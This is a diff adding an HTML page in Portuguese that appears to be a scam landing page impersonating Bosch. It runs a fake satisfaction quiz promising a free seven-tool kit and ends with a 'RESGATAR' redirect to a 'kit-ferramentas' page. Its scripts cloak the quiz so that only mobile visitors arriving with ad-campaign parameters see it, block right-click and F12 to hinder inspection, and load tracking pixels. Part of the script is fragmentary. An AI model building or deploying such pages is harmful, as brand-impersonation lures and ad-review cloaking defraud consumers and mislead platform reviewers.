@@ -1,0 +1,532 @@
+<!DOCTYPE html><html lang="pt-br"><head>
+    <script async="" src="js/fbevents.js"></script><script src="../scripts/utms/latest.js" async="" defer=""></script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <link rel="stylesheet" href="css/bootstrap.min.css">
+    <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="css/all.min.css">
+    <script async="" src="js/fbevents_1.js"></script>
+    <script async="" src="js/fbevents.js"></script>
+    <script src="js/jquery-3.7.1.min.js" crossorigin="anonymous"></script>
+    <link rel="icon" href="dewaltloog.png" type="image/x-icon">
+    <link rel="apple-touch-icon" sizes="180x180" href="index_1.html">
+    <script src="js/bootstrap.bundle.min.js"></script>
+    <title>Bosch Resgate | A Experiência</title>
+    <script>
+      }
+      document.addEventListener("contextmenu", showAlert);
+      document.addEventListener("keydown", e => {
+          if ((e.ctrlKey && disabledKeys.includes(e.key)) || e.key === "F12") {
+              showAlert(e);
+          }
+      });
+      function hasAnyRequiredUTMParameter() {
+          const urlParams = new URLSearchParams(window.location.search);
+          const requiredParams = [
+              'utm_source',
+              'utm_campaign',
+              'utm_medium',
+              'utm_content',
+              'utm_term',
+              'xcod'
+          ];
+          for (let param of requiredParams) {
+              if (urlParams.has(param)) {
+                  return true;
+              }
+          }
+          return false;
+      }
+
+      window.onload = function() {
+          if (!hasAnyRequiredUTMParameter()) {
+              document.getElementById('iframeContainer').style.display = 'block';
+              document.body.style.backgroundColor = '';
+              document.body.style.overflow = '';
+              return;
+          }
+
+          if (isMobileDevice()) {
+              document.getElementById('content').style.display = 'block';
+          } else {
+              document.getElementById('iframeContainer').style.display = 'block';
+          }
+
+          document.body.style.backgroundColor = '';
+          document.body.style.overflow = '';
+      }
+  </script>
+  <script>
+      function onLoad() {
+          var links = document.getElementsByTagName("a");
+          for (var i = 0, n = links.length; i < n; i++) {
+              if (links[i].href.includes("#")) {
+                  continue;
+              }
+              var href = links[i].href.trim() + (links[i].href.indexOf("?") > 0 ? "&" : "?") + document.location.search.replace("?", "").toString();
+              links[i].href = href;
+          }
+      }
+      setTimeout(onLoad, 2000);
+  </script>
+  <script>
+      !function(f,b,e,v,n,t,s)
+      {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+      n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+      if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+      n.queue=[];t=b.createElement(e);t.async=!0;
+      t.src=v;s=b.getElementsByTagName(e)[0];
+      s.parentNode.insertBefore(t,s)}(window, document,'script',
+      'https://connect.facebook.net/en_US/fbevents.js');
+      fbq('init', '1157080335435205');
+      fbq('track', 'PageView');
+  </script>
+  <noscript><img height="1" width="1" style="display:none"
+      src="https://www.facebook.com/tr?id=1157080335435205&ev=PageView&noscript=1"
+  /></noscript>
+  <script>
+      !function(f,b,e,v,n,t,s)
+      {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
+      n.callMethod.apply(n,arguments):n.queue.push(arguments)};
+      if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
+      n.queue=[];t=b.createElement(e);t.async=!0;
+      t.src=v;s=b.getElementsByTagName(e)[0];
+      s.parentNode.insertBefore(t,s)}(window, document,'script',
+      'https://connect.facebook.net/en_US/fbevents.js');
+      fbq('init', '3324384941188965');
+      fbq('track', 'PageView');
+  </script>
+  <noscript><img height="1" width="1" style="display:none"
+      src="https://www.facebook.com/tr?id=3324384941188965&ev=PageView&noscript=1"
+  /></noscript>
+  <style>
+      @media(max-width:767px){
+          .celular{
+              display: block;
+          }
+          .pc{
+              display: none;
+          }
+      }
+      @media(min-width:768px){
+          .celular{
+              display: none;
+          }
+          .pc{
+              display: block;
+          }
+      }
+      #iframeContent {
+          position: fixed;
+          width: 100%;
+          height: 100%;
+          border: none;
+      }
+      #darkBackground {
+          display: none; /* Inicialmente oculto */
+          position: fixed;
+          top: 0;
+          left: 0;
+          width: 100%;
+          height: 100%;
+          background-color: rgba(0, 0, 0, 0.5); /* Fundo preto semi-transparente */
+          z-index: 1000; /* Sobreposição acima do conteúdo */
+      }
+      .card {
+          width: 100%;
+          height: fit-content;
+          padding: 20px;
+          border: 1px solid #d3d3d3;
+          border-radius: 15px;
+      }
+      .apresentacao {
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          justify-content: center;
+          text-align: center;
+      }
+      .dark-background {
+          background: rgb(255, 255, 255); /* Fundo preto com 70% de opacidade */
+          color: #000000; /* Cor do texto branca para contraste */
+      }
+
+      #mobile-content, #iframeContainer {
+          display: none;
+      }
+      #iframeContainer iframe {
+          width: 100%;
+          height: 100vh;
+          border: none;
+      }
+  </style>
+</head>
+<body>
+   <div id="darkBackground" style="display: block;"></div> <!-- Adicionando fundo escuro -->
+   <div id="content" class="celular" style="display: none;">
+    <header style="background-color: white;">
+      <i class="fa-solid fa-bars" style="color: black"></i>
+      <img style="height: 40px;" src="images/bosch.svg" alt="">
+      <span id="saldo" style="margin-left: auto"></span>
+  </header>
+    <main>
+      <!-- Conteúdo do quiz -->
+      <div class="card pergunta01" id="pergunta01">
+        <div class="card__logo">
+          <img src="images/Bosch.jpeg" alt="">
+        </div>
+        <div class="card__satisfacao">
+          <h2>Em uma escala de 1 a&nbsp; 5, quão feliz você ficaria ganhando um KIT desse totalmente de graça?</h2>
+          <div class="card__gradeContainer">
+            <div class="card__grade" id="card__grade1" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star1"></i>
+            </div>
+            <div class="card__grade" id="card__grade2" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star2"></i>
+            </div>
+            <div class="card__grade" id="card__grade3" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star3"></i>
+            </div>
+            <div class="card__grade" id="card__grade4" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star4"></i>
+            </div>
+            <div class="card__grade" id="card__grade5" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star5"></i>
+            </div>
+          </div>
+          <div class="card__gradeDescricao">
+            <p>Muito ruim</p>
+            <p>Muito bom</p>
+          </div>
+        </div>
+        <div class="card__resposta">
+          <h2>Você já possui alguma ferramenta Bosch?</h2>
+          <div class="resposta__gradeContainer">
+            <div class="resposta__grade resposta1" onclick="toggleResponse(this, 'resposta1'); scrollToDown();">
+                <p>Sim</p>
+            </div>
+            <div class="resposta__grade resposta1" onclick="toggleResponse(this, 'resposta1'); scrollToDown();">
+                <p>Não</p>
+          </div>
+          </div>
+        </div>
+        <div class="card__resposta">
+          <h2>Há quanto tempo você conhece a Bosch?</h2>
+          <div class="resposta__gradeContainer">
+            <div class="resposta__grade resposta2" onclick="toggleResponse(this, 'resposta2')">
+              <p>Menos de 5 anos</p>
+            </div>
+            <div class="resposta__grade resposta2" onclick="toggleResponse(this, 'resposta2')">
+              <p>Mais de 5 anos</p>
+            </div>
+          </div>
+        </div>
+        <button class="card__enviarResposta" id="enviarResposta" onclick="pergunta01()" disabled="">
+          Enviar avaliação
+        </button>
+      </div>
+      <div class="card pergunta02" id="pergunta02" style="display: none">
+        <div class="card__logo">
+          <img src="images/1618918921432.JPG" alt="">
+        </div>
+        <div class="card__satisfacao">
+          <h2>De 1 a&nbsp; 5, quanto essa Furadeira Pasafusadeira seria importante para você?</h2>
+          <div class="card__gradeContainer">
+            <div class="card__grade" id="card__grade1" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star1"></i>
+            </div>
+            <div class="card__grade" id="card__grade2" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star2"></i>
+            </div>
+            <div class="card__grade" id="card__grade3" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star3"></i>
+            </div>
+            <div class="card__grade" id="card__grade4" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star4"></i>
+            </div>
+            <div class="card__grade" id="card__grade5" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star5"></i>
+            </div>
+          </div>
+          <div class="card__gradeDescricao">
+            <p>Muito ruim</p>
+            <p>Muito bom</p>
+          </div>
+        </div>
+        <div class="card__resposta">
+          <h2>No último ano, você precisou usar essa ferramenta?</h2>
+          <div class="resposta__gradeContainer">
+            <div class="resposta__grade resposta1" onclick="toggleResponse(this, 'resposta1'); scrollToDown();">
+                <p>Sim</p>
+            </div>
+            <div class="resposta__grade resposta1" onclick="toggleResponse(this, 'resposta1'); scrollToDown();">
+                <p>Não</p>
+          </div>
+          </div>
+        </div>
+        <div class="card__resposta">
+          <h2>Essa ferramenta Bosch seria útil para você?</h2>
+          <div class="resposta__gradeContainer">
+            <div class="resposta__grade resposta2" onclick="toggleResponse(this, 'resposta2')">
+              <p>Sim</p>
+            </div>
+            <div class="resposta__grade resposta2" onclick="toggleResponse(this, 'resposta2')">
+              <p>Não</p>
+            </div>
+          </div>
+        </div>
+        <button class="card__enviarResposta" id="enviarResposta" onclick="pergunta02()" disabled="">
+          Enviar avaliação
+        </button>
+      </div>
+      <div class="card pergunta03" id="pergunta03" style="display: none">
+        <div class="card__logo">
+          <img src="images/Serra-Circular-para-Madeira-150mm-1500W-GKS150-Bosch-Casa-do-Soldador-04.webp" alt="">
+        </div>
+        <div class="card__satisfacao">
+          <h2>Na sua opinião, de 1 a&nbsp; 5, quão satisfeito você está com a Bosch hoje?</h2>
+          <div class="card__gradeContainer">
+            <div class="card__grade" id="card__grade1" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star1"></i>
+            </div>
+            <div class="card__grade" id="card__grade2" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star2"></i>
+            </div>
+            <div class="card__grade" id="card__grade3" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star3"></i>
+            </div>
+            <div class="card__grade" id="card__grade4" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star4"></i>
+            </div>
+            <div class="card__grade" id="card__grade5" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star5"></i>
+            </div>
+          </div>
+          <div class="card__gradeDescricao">
+            <p>Muito ruim</p>
+            <p>Muito bom</p>
+          </div>
+        </div>
+        <div class="card__resposta">
+          <h2>Nos últimos 6 meses, você comprou algum produto relacionado a&nbsp; Bosch?</h2>
+          <div class="resposta__gradeContainer">
+            <div class="resposta__grade resposta1" onclick="toggleResponse(this, 'resposta1'); scrollToDown();">
+                <p>Sim</p>
+            </div>
+            <div class="resposta__grade resposta1" onclick="toggleResponse(this, 'resposta1'); scrollToDown();">
+                <p>Não</p>
+          </div>
+          </div>
+        </div>
+        <div class="card__resposta">
+          <h2>Você já usou alguma Serra Circular?</h2>
+          <div class="resposta__gradeContainer">
+            <div class="resposta__grade resposta2" onclick="toggleResponse(this, 'resposta2'); scrollToDown();">
+                <p>Sim</p>
+            </div>
+            <div class="resposta__grade resposta2" onclick="toggleResponse(this, 'resposta2'); scrollToDown();">
+                <p>Não</p>
+            </div>
+          </div>
+        </div>
+        <button class="card__enviarResposta" id="enviarResposta" onclick="pergunta03()" disabled="">
+          Enviar avaliação
+        </button>
+      </div>
+      <div class="card pergunta04" id="pergunta04" style="display: none">
+        <div class="card__logo">
+          <img src="images/bosch-radio-portatil-gpb-18v-5c.jpg" alt="">
+        </div>
+        <div class="card__satisfacao">
+          <h2>De 1 a&nbsp; 5, qual a sua nota para essa Caixa de Som Bosch?</h2>
+          <div class="card__gradeContainer">
+            <div class="card__grade" id="card__grade1" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star1"></i>
+            </div>
+            <div class="card__grade" id="card__grade2" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star2"></i>
+            </div>
+            <div class="card__grade" id="card__grade3" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star3"></i>
+            </div>
+            <div class="card__grade" id="card__grade4" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star4"></i>
+            </div>
+            <div class="card__grade" id="card__grade5" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star5"></i>
+            </div>
+          </div>
+          <div class="card__gradeDescricao">
+            <p>Muito ruim</p>
+            <p>Muito bom</p>
+          </div>
+        </div>
+        <div class="card__resposta">
+          <h2>Para você, qual é a importância de escutar música no dia a dia?</h2>
+          <div class="resposta__gradeContainer">
+            <div class="resposta__grade resposta1" onclick="toggleResponse(this, 'resposta1')">
+              <p onclick="scrollToDown()">Extremamente importante</p>
+            </div>
+            <div class="resposta__grade resposta1" onclick="toggleResponse(this, 'resposta1')">
+              <p onclick="scrollToDown()">Não muito importante</p>
+            </div>
+          </div>
+        </div>
+        <div class="card__resposta">
+          <h2>Você teria essa caixa de som?</h2>
+          <div class="resposta__gradeContainer">
+            <div class="resposta__grade resposta2" onclick="toggleResponse(this, 'resposta2')">
+              <p onclick="scrollToDown()">Sim</p>
+            </div>
+            <div class="resposta__grade resposta2" onclick="toggleResponse(this, 'resposta2')">
+              <p onclick="scrollToDown()">Não</p>
+            </div>
+          </div>
+        </div>
+        <button class="card__enviarResposta" id="enviarResposta" onclick="pergunta04()" disabled="">
+          Enviar avaliação
+        </button>
+      </div>
+      <div class="card pergunta05" id="pergunta05" style="display: none">
+        <div class="card__logo">
+          <img src="images/ferramentas_a_bateria_img_w900.jpg" alt="">
+        </div>
+        <div class="card__satisfacao">
+          <h2>Em uma escala de 1 a&nbsp; 5, quão acessível você acha o preço das ferramentas Bosch?</h2>
+          <div class="card__gradeContainer">
+            <div class="card__grade" id="card__grade1" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star1"></i>
+            </div>
+            <div class="card__grade" id="card__grade2" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star2"></i>
+            </div>
+            <div class="card__grade" id="card__grade3" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star3"></i>
+            </div>
+            <div class="card__grade" id="card__grade4" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star4"></i>
+            </div>
+            <div class="card__grade" id="card__grade5" onclick="toggleCard(this)">
+              <i class="fa-regular fa-star" id="star5"></i>
+            </div>
+          </div>
+          <div class="card__gradeDescricao">
+            <p>Muito ruim</p>
+            <p>Muito bom</p>
+          </div>
+        </div>
+        <div class="card__resposta">
+          <h2>Qual feedback você gostaria de dar para Bosch?</h2>
+          <div class="resposta__gradeContainer">
+            <div class="resposta__grade resposta1" onclick="toggleResponse(this, 'resposta1')">
+              <p onclick="scrollToDown()">Mais variações de ferramentas</p>
+            </div>
+            <div class="resposta__grade resposta1" onclick="toggleResponse(this, 'resposta1')">
+              <p onclick="scrollToDown()">Melhorar a tecnologia</p>
+            </div>
+          </div>
+        </div>
+        <div class="card__resposta">
+          <h2>Qual alternativa melhor representa você?</h2>
+          <div class="resposta__gradeContainer">
+            <div class="resposta__grade resposta2" onclick="toggleResponse(this, 'resposta2')">
+              <p>Sempre compro as novidades da Bosch</p>
+            </div>
+            <div class="resposta__grade resposta2" onclick="toggleResponse(this, 'resposta2')">
+              <p>Compro as vezes, quando possível</p>
+            </div>
+          </div>
+        </div>
+        <button class="card__enviarResposta" id="enviarResposta" onclick="pergunta05()" disabled="">
+          Enviar avaliação
+        </button>
+      </div>
+      <div class="card finalizacao" id="finalizacao" style="display: none">
+        <div class="finalizacao__titulo">
+          <h1>🎉 Parabéns! Você concluiu nosso Quiz Exclusivo Bosch! 🎉</h1>
+        </div>
+        <div class="finalizacao__trofeu">
+          <img src="images/Bosch.jpeg" alt="">
+        </div>
+        <div class="finalizacao__descricao">
+          <p>
+            Sua pesquisa de satisfação da Bosch garantiu um KIT DE FERRAMENTAS como nosso agradecimento. <strong>Clique no botão RESGATAR abaixo e solicite suas novas ferramentas Bosch!</strong><br><br> Não perca, essa é a sua chance de trabalhar com facilidade e segurança. Mas corra, os estoques são limitados! Att. BOSCH BRASIL
+          </p>
+        </div>
+        <div class="finalizacao__botao">
+          <button id="resgatarButton"><i class="fa-solid fa-gift"></i> RESGATAR</button>
+        </div>
+      </div>
+      <button data-bs-toggle="modal" data-bs-target="#modal01" id="popup" style="display: none"></button>
+      <div class="modal" tabindex="-1" id="modal01">
+        <div class="modal-dialog modal-dialog-centered">
+          <div class="modal-content">
+            <div class="card apresentacao dark-background">
+              <h2>🎁 Bem-vindo ao Quiz Exclusivo Bosch 2024! 🎁</h2>
+              <p>Responda a&nbsp; pesquisa oficial da Bosch e ao final ganhe um KIT COMPLETO DE 7 FERRAMENTAS BOSCH na faixa!</p>
+              <button id="iniciar" type="button" data-bs-dismiss="modal">Vamos começar?</button>
+            </div>
+          </div>
+        </div>
+      </div>
+      <audio id="trilha" loop="">
+        <source src="trilha-kenner.html" type="audio/mpeg">
+      </audio>
+    </main>
+    <script src="js/hideAllExcept.js"></script>
+    <script src="js/selectedCard.js"></script>
+    <script src="js/selectedResponse.js"></script>
+    <script src="js/buttonCheck.js"></script>
+    <script src="js/popup.js"></script>
+    <script src="js/sendResponse.js"></script>
+    <script>
+      $(document).ready(function () {
+        let data = new Date();
+        var date = data.getDate();
+        var month = [
+          "Janeiro",
+          "Fevereiro",
+          "Março",
+          "Abril",
+          "Maio",
+          "Junho",
+          "Julho",
+          "Agosto",
+          "Setembro",
+          "Outubro",
+          "Novembro",
+          "Dezembro",
+        ][data.getMonth()];
+        var year = data.getFullYear();
+        $("#todayDate").html(`${date} de ${month} de ${year}**`);
+      });
+    </script>
+    <script type="text/javascript" src="js/crypto-js.min.js"></script>
+    <script>
+      var popup = document.getElementById("popup");
+      document.addEventListener("DOMContentLoaded", function() {
+          var darkBackground = document.getElementById('darkBackground');
+          popup.click();
+          darkBackground.style.display = 'block';
+          var iniciar = document.getElementById('iniciar');
+          iniciar.addEventListener('click', function() {
+              var trilha = document.getElementById('trilha');
+              trilha.volume = 0.03;
+              trilha.play();
+              darkBackground.style.display = 'none';
+          });
+      });
+      
+      document.getElementById('resgatarButton').addEventListener('click', function(event) {
+            event.preventDefault();
+            var currentUrlParams = window.location.search;
+            window.location.href = "../kit-ferramentas/" + currentUrlParams;
+        });
+  </script>
+  </div>
+  <div class="pc" id="iframeContainer" style="display: block;">
+    <iframe id="iframeContent" src="index_2.html"></iframe>
+  </div>
+
+
+</body></html>
